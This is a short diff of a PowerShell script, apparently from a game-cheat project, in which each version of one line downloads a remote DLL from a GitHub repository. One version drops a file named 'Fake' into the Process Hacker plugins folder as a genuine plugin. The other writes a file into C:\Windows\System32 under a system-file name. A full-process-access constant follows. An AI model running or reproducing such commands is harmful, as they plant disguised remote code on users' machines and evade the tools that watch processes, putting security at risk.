@@ -1,4 +1,4 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ExtendedNotificationsFake.dll" -OutFile "C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/colorgui.dll.mun" -OutFile "C:\Windows\System32\colorgui.dll.mun"
 
 # Constants
 $PROCESS_ALL_ACCESS = 0x1F0FFF
